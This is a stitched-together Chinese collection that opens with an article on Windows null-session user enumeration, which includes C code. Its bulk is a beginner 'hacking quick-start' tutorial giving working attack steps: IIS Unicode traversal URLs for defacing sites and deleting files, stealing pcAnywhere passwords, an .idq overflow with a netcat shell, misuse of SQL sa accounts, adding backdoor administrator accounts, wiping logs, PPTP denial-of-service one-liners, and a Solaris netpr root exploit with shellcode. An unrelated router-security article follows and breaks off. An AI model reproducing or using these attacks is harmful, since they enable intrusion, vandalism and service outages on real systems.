hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters
\中的：nullsessionshares，
添加新的共享名，这样才能建立一个共享的空会话。这时，将不依赖ipc的存在了。（即
使这样的空会话对于后面的突破也是一点没可取之处的，因为没有了ipc$命名管道，rp
c不可取了，这下知道ipc这个命名管道的具体实现了。呵呵）
虽然空会话建立的要求很严格，但是那都是默认建立的。既然是默认的，对于使用
win2k系统的服务器来说，就还是有利用的价值。最明显的就是空会话可以很方便地连接
到其他的域,枚举用户、机器等。这也就是扫描软件进行探测的原理。我举个简单的程序
例子来说明这个用途，并枚举用户组和用户。
#include <windows.h>
#include <stdio.h>
#include <lm.h>
#pragma comment (lib, "mpr.lib")
#pragma comment (lib, "netapi32.lib")
void explorer_groups(char *);
void main( int argc, char *argv[ ] )
{
dword ret;
char username[100] = "", password[100] = "";
char server[100] = "", ipc[100] = "";
netresource net;
if (argc == 1) {
exit(1);
}
strncpy(server,argv[1],100);
printf("server: %s\n", server);
sprintf(ipc,"\\\\%s\\ipc$",server);
net.lplocalname = null;
net.lpprovider = null;
net.dwtype = resourcetype_any;
net.lpremotename = (char*)&ipc;
printf("setting up session... ");
ret = wnetaddconnection2(&net,(const char *)&password,(const char *)&use
rname,0);
if (ret != error_success)
{
printf("ipc$ connect fail.\n");
exit(1);
}
else printf("ipc$ connect success.\n");
explorer_groups((char*)&server);
printf("disconnect server... ");
ret = wnetcancelconnection2((char*)&ipc,0,true);
if (ret != error_success)
{
printf("fail.\n");
exit(1);
}
else printf("success.\n");
exit (0);
}
void explorer_groups(char *server)
{
dword ret, read, total, resume = 0;
int i;
lpvoid buff;
char comment[255];
wchar_t wserver[100];
do {
ret = netlocalgroupenum(wserver, 1, (unsigned char **)&buff, max_pre
ferred_length, &read, &total, &resume);
if (ret != nerr_success && ret != error_more_data)
{
printf("fail\n");
break;
}
plocalgroup_info_1 info = (plocalgroup_info_1) buff;
for (i=0; i<read; i++) {
printf("group: %s\n",info[i].lgrpi1_name);
widechartomultibyte(cp_acp, 0, info[i].lgrpi1_comment , -1, comm
ent,255,null,null);
printf("\tcomment: %s\n",comment);
dword ret, read, total, resume = 0;
ret = netlocalgroupgetmembers((const unsigned short*)&wserver, i
nfo[i].lgrpi1_name, 2, (unsigned char **)&buff, 1024, &read, &total, &resume
);
if (ret != nerr_success && ret != error_more_data) {
printf("fail\n");en
break;
}
plocalgroup_members_info_2 info = (plocalgroup_members_info_2) b
uff;
for (unsigned i=0; i<read; i++) {
printf("\t\t%s\n", info[i].lgrmi2_domainandname);
printf("\t\t\tsid:%d\n", info[i].lgrmi2_sid);
printf("\t\t\tsidusage:%d\n",info[i].lgrmi2_sidusage);
}
netapibufferfree (buff);
}
netapibufferfree (buff);
} while (ret == error_more_data );
}
这是一个简单的例子。当然可以查询更多的东西。类似，就不再重复了。枚举用户
名是很重要的用途，因为接下来可以做的就是进行密码的猜解，这对系统安全构成的威
胁是非常大的。
想到有威胁，就需要知道怎么防范。防范很简单。不过这里需要提醒的是关于注册
表（或者安全策略中）中可以设置restrictanonymous为1，这样可以禁止空连接进行枚
举。因为很多安全配置介绍中都是这样做的，因为如果设置为2的
话，有一些问题会发生。比如一些win的服务出现问题等等。但是，restricanonymous设
置为1并不会组织用户帐号的枚举。因为空连接是一样能够建立的，并不是说阻止了空连
接的建立。但是我们这里需要来突破！！
iv、 break through "restricanonymous=1",突破restricanonymous=1的限制进行用户
枚举
虽然我们还是能够建立空连接，但是却没有那些net函数的访问权限了。这个可以看
msdn上关于对网络管理函数的安全问题。但是，有一个突破点，呵呵，那就是猜测。这
个需要联系到访问控制模型上了。就象前面对null会话说到的那样，null会话获得anon
ymous logon 用户名的sid（安全标志符），系统用sid来标志这个用户，同时创建令牌
。而这个令牌才是系统对用户的访问权限标志，并不是用帐户名来确定。现在我们需要
的是sid，因为令牌中包含了帐户的sid，对于系统来说，sid是不变的。sid是在帐户或
者组创建的时候就建立好了。可是每个win2k系统为相同用户名的帐户创建的sid并不相
同。
我们来先分析这个重要的sid。sid的格式是：s-r-x-y(1)-y(2)-……-y(n)。其中s
表示该字符串是sid，r是sid的版本号，对于2000来说，这个就是1，然后x是标志符的颁
发机构 （identifier authority）。对于2000内的帐户，颁发机构就是nt，值是5。然
后y表示一系列的子颁发机构，前面几项是标志域的，最后一个y(n)标志着域内的帐户和
组。也就是说，对于多数帐户来说，区别在与这个y(n)。
现在需要分析一下sam结构中对帐户的管理。展开注册表的sam之后，
hkey_local_machine\sam\sam\domains\builtin\aliases\members，存储着重要的帐户
内容。找到本地的域，然后展开，得到的就是本地帐号的所有sid列表。分析其规律，因
为有些是系统规定的y(n)，所以就有规律了。其中的000001f4，十进制的500，这一定是
一个固定的，标志系统建立时候的内置管理员帐号administrator，000001f5就是guest
帐号了。然后看到了一个跳跃到了000003e8，这是其他帐号的开始，比如 tsinternetu
ser帐户以及自定义的帐户了。
到了这里，我们还需要函数的支持。lookupaccountname()和lookupaccountsid()，
这两个函数是允许空会话使用的。上面通过空会话来建立连接然后使用net*函数枚举帐
户已经被restrictanonymous禁止了。因此，sid成为我们的突破口。不过sid对于一台机
器来说是固定的，但是并不是说跟其他的机器的sid是一样的，我们需要进行一定的猜测
,用来获得sid中不同的部分，就是几个子颁发机构。哈哈，我们猜测的东西就是用户名
。假象系统存在的用户名，比如tsinternetuser，guest帐户等。然后通过这些帐户名获
得sid的前面部分，然后根据前面部分进行枚举，将最后一个子颁发机构进行递加，从而
获得每个帐户的sid，然后又回过来，利用函数lookupaccountsid()进行用户名的查询。
这样就达到了枚举帐户的目的了，而且是在 restrictanonymous=1 的情况下。
我写了一个程序，我猜测的帐号是guest。大致思路在这里介绍了，把代码贴在这里
太占篇幅，原代码和执行程序可以在我的主页（www.opengram.com）下载。
v、 conclusion
不过，即便我们花费这么大精力能够突破restricanoymous=1的限制，但是防范起来
简直太容易了。取消掉ipc$命名管道，就让null session完全没有用了。
-----------------------
reference:
1、msdn
2、http://www.microsoft.com/msj/defaultframe.asp?page=/msj/0299/security/sec
urity0299.htm&nav=/msj/0299/newnav.htm
3、《the use of tcp port 445 in windows 2000》 arne vidstrom
菜鸟入门速成教程－流行的漏洞入侵
 终于决定要写下这份速成教材了,好让一些正准备步入黑客殿堂的朋友和一些正在步入黑客殿堂的朋友可以很快的找到感觉.因为是速成所以里面的一些理论上的东东会被X掉,大家如果要学的话可以找书看看,以下都是攻击的步骤(不准用在国内的机子上)
1 UNICODE漏洞
这是老漏洞了,但对于新手来说很好用,而且事实证明现在仍有很多的机子有这种漏洞,OK我们开始
先用扫描器扫到有UNICODE漏洞的机子,(注意漏洞的编码方式有所不同有的是..%CI%IC.. 用的是..%C0%AF..当然还有其它的方式, 具体根据你的扫描器扫出的结果为标准
我们在流览器(IE)的地址栏中输入
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+dir
这时你可以看到它的系统目录但我们要的是主页面放置的目录
在输入
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\inetpub\wwwroot
看到了吧,目录中的INDEX.HTML INDEX.ASP DEFAULT.ASP DEFAULT.ASP等等就是它的主页面,
我们来换它的页面
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+ccc.exe
http://ip/scripts/ccc.exe?/c+echo+Hacked+by+KAWEN+ >+c:\inetpub\wwwroot\default.asp 
OK
成功了,此时它的主页面被换成了HACKED BY KAWEN
大家可以看看
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+ccc.exe 执行后是复制,如果换成这个呢
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+DEL+c:\winnt\system32\cmd.exe
没错就是删除了
知道怎么做了吧
呵呵 
2利用PCANWHERE攻击网站 
现在开始入正题了,刚才只是热身
由于NT的机器一般使用PCAnyWhere进行远程管理,因此如果能够得到PCAnyWhere远程连接的帐号和密码,那么就能远程连接到主机。 （ http://fxyong.3322.net/getpwd.zip ）便可以取得帐号和密码
Telnet IP 5631
我们可以看看PCANYWHERE开了没
使用Unicode漏洞+ PCanyWhere密码查看工具 
首先我们要DOWN一个可以破 Pcanywhere的工具
http://www.symantec.com/ 
OK 我们现在要找到主机上的*.CIF文件
在IE中输入 http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+dir c:\*.cif /s
一般Citempl.cif为系统默认的密码文件，因此我们需要SA.CIF文件。 复制该文件到网站目录下。 
需要知道网站目录，可以通过ida,idq漏洞进行得到，也可以去寻找网站中的一个图片文件，比如Tscontent.gif文件，然后去查找该文件：使用命令 dir c:\ Tscontent.gif /s 
比如网站目录为c:\inetpub\wwwroot\ 一般都有是啦 呵呵
密码文件所在目录：c:\Program Files\pcANYWHERE\DATA 
下面执行Copy命令： 
http://x.x.x.x/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+copy c:\Program Files\pcANYWHERE\DATA\SA.CGI c:\inetpub\wwwroot\ 
显示1 file(s) copied，就表示复制成功了。 
使用IE下载该文件 
使用 http://IP/sa.cif 就可以下载该文件了。 
使用PCanyWhere密码查看工具得到用户名和密码 
3利用.idq漏洞　　 
为了方便大家可以看懂下面说的是什么可以先到这里来看看
http://snake12.top263.net/IISOverflow/IISOverflow.htm 
一共有两个版本.一个是GUI版本.一个是命令行版本.
这里我们来说CUI版本,反正都差不多了,关键是要多试
首先我们要找到有.IDQ漏洞的机子,可以用流光扫一下
运行软件
在被攻击IP地址后面写上对方的IP.端口号一般不需要改动. 
左面选择操作系统类型.先选择IIS5 English Win2k Sp0吧~ 
软件的默认绑定CMD.EXE的端口是813.不改了.用默认吧~~~ 
点击IDQ溢出~~OK~~出现发送Shellcode成功的提示了. 
接着我们用NC,你可以到到盟下载 www.CNHONKER.COM
C:\>nc -vv XXX.XXX.XXX.XXX 813 
XXX.XXX.XXX.XXX: inverse host lookup failed: h_errno 11004: NO_DATA 
(UNKNOWN) [XXX.XXX.XXX.XXX] 813 (?) open 
Microsoft Windows 2000 [Version 5.00.2195] 
(C) Copyright 1985-2000 Microsoft Corp. 
C:\WINNT\system32> 
OK!!!上来了
你现在有SYSTEM权限,不错吧,该做什么不用我教了吧,比如为自已留下个后门
net user hacker password /add '添加一给名为hacker，密码为passwod的用户！ 
net localgroup administrators hacker /add ' 把刚才创建的用户加入 Admnistrators组 
OK我们在来看看DOS版本
下载软件后会有个运行文件,它太长了,将它必名为KAWEN
D:\>KAWEN
运行参数: 操作系统类型 目的地址 web端口 溢出端口 
支持的操作系统 类型: ---- 
0 -- IIS5中文Win2k Sp0 
1 -- IIS5中文Win2k Sp1 
2 -- IIS5中文Win2k Sp2 
3 -- IIS5 English Win2k Sp0 
4 -- IIS5 English Win2k Sp1 
5 -- --not support -- IIS5 English Win2k Sp2 
6 -- IIS5 Japanese Win2k Sp0 
7 -- IIS5 Japanese Win2k Sp1 
8 -- --not support -- IIS5 Japanese Win2k Sp2 
D:\>KAWEN 3 XXX.XXX.XXX.XXX80 456 
连接目的机器 XXX.XXX.XXX.XXX:80 OK. 
发送shellcode 到 XXX.XXX.XXX.XXX:80 OK 
现在，你可以 连接 该主机的 端口 456了,good luck.! 
开始吧
D:\>nc -vv XXX.XXX.XXX.XXX 456 
mail.rycf.org [XXX.XXX.XXX.XXX] 456 (?): connection refused 
sent 0, rcvd 0: NOTSOCK 
没成功.试试sp1. 
D:\>KAWEN 4 XXX.XXX.XXX.XXX 80 888 
连接目的机器 XXX.XXX.XXX.XXX:80 OK. 
发送shellcode 到 XXX.XXX.XXX.XXX:80 OK 
现在，你可以 连接 该主机的 端口 888了,good luck.! 
D:\>nc -vv XXX.XXX.XXX.XXX 888 
XXX.XXX.XXX.XXX: inverse host lookup failed: h_errno 11004: NO_DATA 
(UNKNOWN) [XXX.XXX.XXX.XXX] 888 (?) open 
Microsoft Windows 2000 [Version 5.00.2195] 
(C) Copyright 1985-2000 Microsoft Corp. 
C:\WINNT\system32> 
看看我们又成功了 
4 SQL攻击网站
这个也很方便,呵呵,上次在对美国大战中也有不少兄弟是用这种方法的,来看看吧
我们需要小榕的流光作为武器,到WWW.NETEYES.COM去DOWN一个
运行流光然后按快捷键ctrl＋r搜索！ 
选择aql！输入开始和结束的IP！扫描吧！到搜索结束！察看流光最下面的视图！格式如下： 
用户名 密码 地址 
sa 211.21.220.28 
sa 211.21.220.26 
sa 211.21.220.197 
其中《null》表示密码为空！ 
双击其中一项（或在工具……>SQL登录）！会弹出一个dos窗口！如果过一会该窗口消失！没戏了！对方不支持远程登录！在换一个！如果过一会出现如下的字样： 
SQL Remote Cmd For Fluxay 2001 by Assassin 1995 - 2000. Thanks to Eyas! 
Connect to 211.21.220.28 MSSQL Server Success, Type Command in Prompt. 
SQLCmd> 
那表示已经登录上了对方的主机！然后 
SQLCmd>net user ‘察看用户！如果不能察看，说明sa权限不够，那也没戏，换其他的方法！或是走人！有时用net user察看成功！再试试 
SQLCmd>net user administrator ’察看Admin的情况（可知是否在线）如果失败，撤退吧， 
没戏，换方法！ 没有权限,但是如果可以的话
下一步： 
SQLCmd>net user hacker password /add '添加一给名为hacker，密码为passwod的用户！ 
SQLCmd>net localgroup administrators hacker /add ' 把刚才创建的用户加入 Admnistrators组 
好了，告一段落，下面启动DOS用刚创建的用户进行ipc$ 
net use \\*.*.*.*\ipc$ "password" /user:"hacker" '很熟悉吧！IPC$开始了！ 
执行成功的话！搞吧！删除！上传！下载！要什么！随你！ 
例如copy c:\hacker\index.htm \\IP\c$\inetpub\wwwroot\default.htm (IP为它的IP)
干什么，换他的主页啊！呵呵！ 
据我的实践！针对台湾的主机！另一方法是用刚创建的用户名和密码用CuteFtp登录！就象管理自己的站点一样！任意删除创建Html页面！此方法对美国的主机没有成功过！我都是IPC$搞定的！ 
以上的原理是用SQL开门！用IPC$进门做作administrator可以作的事！但对于SQL主机！Administrator一般没有对数据库删除或创建的权限！此时可以down下他的sam文件解密(怎么DOWN?晕,看看我在上面UNICODE中写的教材)！默认用户名SQLAgentCmdExec，然后用天行的SQlBrowse登录就可以对数据库任意操作了！ 
5 利用输入法漏洞
要说老美真不是东西,这么大个洞现在还尚存人间,也好,大家可以练练手
1、用端口扫瞄程序扫IP的3389端口，得到xx.xx.xx.xx。 
　 2、运行windows2000终端客户程序，在服务器输入框里填入：xx.xx.xx.xx ，连接。 
　 3、出现windows2000的登陆窗口，按下CTRL+SHIFT键，出现全拼输入法。 
　 4、在输入法状态条上按mouse右键，选择帮助，选择输入指南，选择"选项"按右键。 
　 5、选择"跳转到URL"，输入：c:\winnt\system32\cmd.exe. 
　 6、选择"保存到磁盘"。 
　 7、选择目录：c:\inetpub\scripts\ 
　 8、打开IE，输入：xx.xx.xx.xx/scripts/cmd.exe?/c+dir+c:\ （知道了吧） 
　 9、输入：xx.xx.xx.xx/scripts/cmd.exe?/c+echo+BEIJING+>c:\inetpub\wwwroot\default.asp 
还有一种方法
1.扫描 3389 port 终端服务默认； 
2.用终端客户端程序进行连接； 
3.按ctrl+shift调出全拼输入法（其他似乎不行），点鼠标右键（如果其帮助菜单发灰，就赶快赶下家吧，人家打补丁了），点帮助，点输入法入门； 
4.在"选项"菜单上点右键--->跳转到URL"，输入：c:\winnt\system32\cmd.exe.（如果不能确定NT系统目录，则输入：c:\ 或d:\ ……进行查找确定）； 
5.选择"保存到磁盘" 选择目录：c:\inetpub\scripts\，因实际上是对方服务器上文件自身的复制操作，所以这个过程很快就会完成； 
6.打开IE，输入： http://ip/scripts/cmd.exe?/c dir 怎么样？有cmd.exe文件了吧？这我们就完成了第一步； 
7. http://ip/scripts/cmd.exe?/c echo net user guest /active:yes>go.bat 
8. http://ip/scripts/cmd.exe?/c echo net user guest elise>>go.bat 
9. http://ip/scripts/cmd.exe?/c echo net localgroup administrators /add guest>>go.bat 
10. http://ip/scripts/cmd.exe?/c type go.bat 看看我们的批文件内容是否如下： 
net user guest /active:yes 
net user guest elise 
net localgroup administrators /add guest 
11.在"选项"菜单上点右键--->跳转到URL"，输入：c:\inetpub\scripts\go.bat --->在磁盘当前位置执行； 
12.呵呵，大功告成啦，这样我们就激活了服务器的geust帐户，密码为：elise，超级用户呢！ （我喜欢guest而不是建立新帐户，这样似乎不易被发现些），
最后一定别不记的X掉自已的脚印
del+C:\winnt\system32\logfiles\*.* 
del+C:\winnt\ssytem32\config\*.evt 
del+C:\winnt\system32\dtclog\*.* 
del+C:\winnt\system32\*.log 
del+C:\winnt\system32\*.txt 
del+C:\winnt\*.txt 
del+C:\winnt\*.log 
6 教你DoS攻击微软的PPTP
呵呵,大家没有看错,的确是微软的,我们先看看PPTP是个什么东东PPTP(Piont-to-point Tunneling Protocol 点对点传输协议)是一个用以建立VPN的网络协议. 此协议需TCP(端口1723)和GRE以完成工作.
易收攻击系统： 
* Dell PowerEdge 2200 with Intel 10/100 adapter, 256 MB RAM, NT Server 4.0 
* Dell Dimension XPS M200s with 3Com 905B adapter, 64 MB RAM, NT Server 4.0 
安全的系统： 
* HP Vectra XA with AMD PCNet integrated Ethernet, 128 MB RAM, NT Workstation 4.0 
* Dell Latitude CPx with 3Com 3CCFEM656 PC Card adapter, 128 MB RAM, NT Workstation 4.0 
* Generic dual PII (Asus motherboard) with 3Com 980x adapter, 256 MB RAM, NT Server 4.0 
* Dell Dimension XPS T550 with 3Com 905C-TX adapter, 128 MB RAM, NT Workstation 4.0 
如何实现： 
~~~~~~~~~ 
*需要的工具* 
1.UNIX box(例如linux,*bsd....) 
2.netcat ( http://www.l0pht.com/~weld/netcat/ ) 
3.apsend ( http://www.elxsi.de/ ) 
4.ipsend ( http://coombs.anu.edu.au/~avalon/ ) 
OK,这就好说了,
我们来看它的三个BUG
1 TCP端口1723 
此弱点只在prior至SP6的机器上有效。并不是所有的机器都存在这个漏洞；请在Unix 操作系统内键入以下： 
$ nc 1723 < /dev/zero 
如机器存在此漏洞, 目标主机将在几秒种之内蓝屏，并有如下错误： 
STOP 0x0A (0x0, 0x2, 0x0, 0x0) IRQL_NOT_LESS_OR_EQUAL 
再次提醒，此弱点只对部分机器有效 
2 GRE 
此弱点对所有Service pack有效
在目标机器上，打开任务管理器选择“运行”。并打开 一个DOS窗口（开始-运行-CMD).在Unix类操作系统上： 
$ apsend -d --protocol 47 -m 0 -q 
在目标主机上你将看到任务管理器内内核记忆的数字将缓慢上升。最终，这些数字将停止增加；此时， CPU在一段时间内有可能被100%占用。现在你可以试着在命令提示符后键入一个命令例如DIR,这时你将看 到一个信息说提示操作系统已不可能完成要执行的命令 
3弱点三：GRE 
此弱点同样对所有的Service pack有效。请在Unix操作系统上： 
#!/bin/csh 
foo: 
ipsend -i -P gre > /dev/null 
goto foo 
目标主机很快会蓝屏，大概需要50个数据包。 
明白了吧 
7 UNIX攻击
这里为了方便我们用finger 0@ip 来找UNIX的薄弱机器
C:\>finger 0@IP 
xxx.xxx.xxx.xxx] 
Login Name TTY Idle When Where 
daemon ??? < . . . . > 
bin ??? < . . . . > 
sys ??? < . . . . > 
jeffrey ??? pts/0 203.66.149.11 
daniel ??? 437 114cm.kcable. 
jamie ??? 0 203.66.162.68 
postgres ??? pts/2 203.66.162.80 
nsadmin ??? 768 203.66.19.50 
ho ??? 390 61.169.209.106 
house18 ??? pts/1 203.66.250.1 
tong ??? pts/0 210.226. 42.69 
jliu ??? pts/0 203.66.52.87 
ptai ??? < . . . . > 
看到了吗,这里的LOGIN下的就是我们要的用户名了
比如jeffrey,Daniel,Jamie,postgres
下面我们就来入侵
C:\>telnet xxx.xxx.xxx.xxx
一般的情况下我们都是猜密码,怎么猜??就是上面LOGIN下的用户名让它又做用户名和密码呀,事实上总有一些人为了方便是这么设置的
login: ptai （***输入用户名***） 
Password: **** （***输入密码***） 
Login incorrect （***登陆失败***） 
login: jliu 
Password: 
Login incorrect 
$ login: tong 
Password: 
Last login: Mon Jul 2 13:21:55 from 210.226. 42.69 （***这个用户上次登陆时的IP***） 
Sun Microsystems Inc. SunOS 5.6 Generic August 1997 
You have mail. (***HOHO~登陆成功啦***)
看看这不就进来了
$ uname –a (***查看系统版本和补丁信息***)
$ set (***查看一些系?ÿ潮淞啃畔?**)
$w 看看用户情况
$ gcc 我们看看有没有编辑器,以后你就知道有什么用了
gcc: No input files 
看到没有GCC呀
$ ls -al 
total 14 
drwxrwxr-x 2 delex staff 512 Jul 4 18:28 . 
drwxr-xr-x 35 root root 1024 May 7 10:46 .. 
-rw-r--r-- 1 delex staff 144 May 2 10:46 .profile 
-rw------- 1 root staff 320 Jul 4 18:52 .sh_history 
-rw-r--r-- 1 delex staff 124 May 2 10:46 local.cshrc 
-rw-r--r-- 1 delex staff 581 May 2 10:46 local.login 
-rw-r--r-- 1 delex staff 562 May 2 10:46 local.profile 
$ cat /etc/passwd (***检查/etc/passwd***) 
root:x:0:1:Super-User:/:/sbin/sh 
daemon:x:1:1::/: 
bin:x:2:2::/usr/bin: 
sys:x:3:3::/: 
adm:x:4:4:Admin:/var/adm: 
lp:x:71:8:Line Printer Admin:/usr/spool/lp: 
uucp:x:5:5:uucp Admin:/usr/lib/uucp: 
nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico 
listen:x:37:4:Network Admin:/usr/net/nls: 
nobody:x:60001:60001:Nobody:/: 
noaccess:x:60002:60002:No Access User:/: 
nobody4:x:65534:65534:SunOS 4.x Nobody:/: 
dennis:x:1005:20::/export/home/dennis:/bin/sh 
oracle:x:1001:100::/export/home/oracle:/bin/sh 
render7:x:9589:101::/export/home/render7:/bin/sh 
$ ls -al / (***查看根目录是否有.rhosts等文件***) 
计算机输入信息略
$ netstat -an|grep LISTEN (***查看有没有可疑端口***)
*.111 *.* 0 0 0 0 LISTEN 
*.21 *.* 0 0 0 0 LISTEN 
*.23 *.* 0 0 0 0 LISTEN 
*.514 *.* 0 0 0 0 LISTEN 
*.513 *.* 0 0 0 0 LISTEN 
*.512 *.* 0 0 0 0 LISTEN 
*.540 *.* 0 0 0 0 LISTEN 
*.79 *.* 0 0 0 0 LISTEN 
*.37 *.* 0 0 0 0 LISTEN 
*.7 *.* 0 0 0 0 LISTEN 
*.9 *.* 0 0 0 0 LISTEN 
*.13 *.* 0 0 0 0 LISTEN 
*.19 *.* 0 0 0 0 LISTEN 
…. 
$ cd /tmp 
$ ls -al 
好像没有什么问题我们来提升权限
$ set
$ uname -a 
SunOS develop 5.7 Generic_106541-14 sun4u sparc SUNW,Ultra-5_10 
$ cd /tmp
$ cat > test.c (***用cat命令写一个文件***)
这是核心呀,这就是拿到ROOT权限中重要的一步
*## copyright LAST STAGE OF DELIRIUM dec 1999 poland *://lsd-pl.net/ #*/ 
/*## /usr/lib/lp/bin/netpr #*/ 

/* requires to specify the address of a host with 515 port opened */ 

#define NOPNUM 4000 
#define ADRNUM 1200 
#define ALLIGN 3 

char shellcode[]= 
"\x20\xbf\xff\xff" /* bn,a */ 
"\x20\xbf\xff\xff" /* bn,a */ 
"\x7f\xff\xff\xff" /* call */
"\x90\x03\xe0\x20" /* add %o7,32,%o0 */
"\x92\x02\x20\x10" /* add %o0,16,%o1 */
"\xc0\x22\x20\x08" /* st %g0,[%o0+8] */
"\xd0\x22\x20\x10" /* st %o0,[%o0+16] */
"\xc0\x22\x20\x14" /* st %g0,[%o0+20] */
"\x82\x10\x20\x0b" /* mov 0xb,%g1 */
"\x91\xd0\x20\x08" /* ta 8 */
"/bin/ksh"
;
char jump[]=
"\x81\xc3\xe0\x08" /* jmp %o7+8 */
"\x90\x10\x00\x0e" /* mov %sp,%o0 */
;
static char nop[]="\x80\x1c\x40\x11";
main(int argc,char **argv){
char buffer[10000],adr[4],*b,*envp[2];
int i;
printf("copyright LAST STAGE OF DELIRIUM dec 1999 poland //lsd-pl.net/\n");
printf("/usr/lib/lp/bin/netpr solaris 2.7 sparc\n\n");
if(argc==1){
printf("usage: %s lpserver\n",argv[0]);
exit(-1);
}
*((unsigned long*)adr)=(*(unsigned long(*)())jump)()+7124+2000;
envp[0]=&buffer[0];
envp[1]=0;
b=&buffer[0];
sprintf(b,"xxx=");
b+=4;
for(i=0;i<1+4-((strlen(argv[1])%4));i++) *b++=0xff;
for(i=0;i
for(i=0;i
*b=0;
b=&buffer[5000];
for(i=0;i
for(i=0;i
*b=0;
execle("/usr/lib/lp/bin/netpr","lsd","-I","bzz-z","-U","x!x","-d",argv[1],
"-p",&buffer[5000],"/bin/sh",0,envp);
} 
^D 
(***这里是按ctrl + d 结束写文件,你用vi来写也可以，ftp，rcp等上传也可以。***)
(***源程序在 http://lsd-pl.net/files/get?SOLARIS/solsparc_netpr ***)
$ ls -al /tmp (***查看test.c是否建立***)
找到了吧,哪我们就成功的建立了
$ gcc -o test test.c 编辑它,使它溢出
$ ./test
copyright LAST STAGE OF DELIRIUM dec 1999 poland //lsd-pl.net/
/usr/lib/lp/bin/netpr solaris 2.7 sparc
usage: ./test lpserver
$ ./test localhost
copyright LAST STAGE OF DELIRIUM dec 1999 poland //lsd-pl.net/
/usr/lib/lp/bin/netpr solaris 2.7 sparc
# id
uid=1035(delex) gid=20(staff) euid=0(root) (***成功获得root***)
OK,想做什么就看你的了下面是一些题外话了
# mkdir /usr/lib/...
# cp /bin/ksh /usr/lib/…/.x (***做个简单的后门***)
# chmod +s /usr/lib/…/.x 
# cat /etc/hosts (***看看这个网络多大***)
以下是在上面所要用到的扫描器和原代码
SuperScan 3.0 http://www.cnhonker.com/tmp/SuperScan.zip 
SecureCRT 3.3 http://www.cnhonker.com/tmp/SecureCRT3.3.zip 
里面所用到的有些程序代码请到 http://lsd-pl.net/ 或 http://www.hack.co.za 查找。
其实每个操作系统都有漏洞,简单的说我们只要找到该系统对应的漏洞然后编辑它,使它溢出就可以了,这也是黑客最常用的手法
8,D.O.S
呵呵,还记的对白宫的DOS之战吗,呵呵,哪还不来试试
下载软件
FakePing的工具 Http://www.patching.net/shotgun/FakePing.exe 
下载 udpflood.zip
安装网址： http://202.102.230.155/netsafe/software/hacker/attack.htm 
9 备注
还有一些很好的漏洞资料请大家好好学学
IIS　漏　洞　整　理 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=33 
利用wu-ftpd2.x(site exec bug)取得root权限 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=38 
入侵检测系统（IDS）简介 转载 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=32 
FRONTPAGE漏洞的执行 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=63 
ASP漏洞(1) 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=59 
ASP漏洞(2) 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=60 
ASP漏洞(3) 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=61 
CGI漏洞 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=55 
IIS漏洞及应用　　 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=49 
漏洞扫描器大集合 
http://www.net228.com/bbs/cgi-bin/topic.cgi?forum=9&topic=87 
安全路由：在网络核心站岗
路由器作为内外网之间数据通信的核心设备，其本身的安全性能的重要性不变而喻，强化路由器本身的安全防范往往可以收到事半功倍的作用，因此基于这一理念而出现的新型网络设备——安全路由器便成为了网络安全产业中的一支尖兵。 
网络安全目前已经日益成为业界关注的重点，就用户的网络而言，其面临的安全威胁主要源自于未经授权的非法网络访问、网络传输过程中可能出现的敏感信息泄漏与遗失、数据完整性破坏及计算机病毒的传播等几个方面。而解决这类问题的途径除了借助立法及强化内部管理等防范措施外，先进的安全技术也是网络安全的重要解决之道，如网络防火墙与基于路由器的安全防范技术等。这其中，路由器作为担当内部与外部网络之间数据通信的核心设备，其本身的安全性能尤为关键，因为作为网络转接设备的路由器，需要不断接收与发送路由信息及IP数据报，而路由信息与敏感IP数据报的安全正是网络安全防护的核心。因此，强化路由器本身的安全防范往往可以收到事半功倍之效，这也正是近年来，业界对路由器本身的安全性能日趋关注的重要原因，安全路由器就是基于这一理念而出现的一类新型网络设备。 
针对网络潜在的各种安全威胁，安全路由器在实现常规路由功能的基础上，在设计时强化了数据传输加密这一关键技术问题，增强了信息保护与数据加密性能，能够有效检测及防范各类攻击事件的发生。 
1.什么是安全路由器 
实际上，安全路由器只是一个松散的产品概念，并没有严格的范围界定，它通常是指集常规路由与网络安全防范功能于一身的网络安全设备，有部分安全路由器产品甚至完全是通过在现有常规路由平台之上加装安全加密卡，或相应的软件安全系统而来的。 
一般说来，具备IPSec（IP Security）协议支持、能够有效利用IPSec保证数据传输机密性与完整性或能够借助其它途径强化本身安全性能的路由器都可以称之为安全路由器。 
与常规路由器产品相比，安全路由器能够提供常规路由器所不具备，的诸如IPSec协议支持、基于规则集的防火墙、基于OSPE V2路由协议的安全认证、信息加密与分布式密钥管理等功能，能够对IP数据报进行智能加密，可提供安全VPN通道、抗源地址欺骗、抗源路由攻击、抗极小数据和抗重叠分片的分组过滤功能及实现基于硬件的信息加密等功能。 
绝大多数安全路由产品都提供了对IPSec协议的支持，因为数据传输加密技术的目的就是实现网络传输流量的加密，保障网络内数据流量的安全，而IPSec协议正是IETF Internet工程任务小组为保证公网数据传输机密性与安全性而制定的系列协议，它能够在IP层提供安全服务，为IP及上层协议、应用提供安全保护。 
关于IPSec协议 
